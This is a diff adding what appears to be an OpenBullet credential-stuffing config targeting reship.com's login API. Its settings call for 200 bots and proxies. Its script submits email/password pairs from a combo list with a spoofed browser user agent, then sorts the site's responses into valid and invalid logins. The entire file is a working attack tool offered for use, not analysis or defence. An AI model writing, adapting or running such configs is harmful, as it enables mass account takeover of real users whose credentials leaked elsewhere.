@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "reship.com",
+  "SuggestedBots": 200,
+  "LastModified": "2019-05-19T23:59:06.0665018-07:00",
+  "AdditionalInfo": "",
+  "Author": "protocol",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomNum 1000000000 1900000000 -> VAR "TOKEN" 
+
+REQUEST POST "https://www.reship.com/rest/api/1/auth?timestamp=<TOKEN>" 
+  CONTENT "{\"emailAddress\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.reship.com" 
+  HEADER "Referer: https://www.reship.com/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false,\"message\":\"Your email address was not found. Please register for a new account.\"}" 
+    KEY "Your email address was not found" 
+    KEY "{\"success\":false,\"message\":\"Invalid password\"}" 
+    KEY "Invalid password" 
+
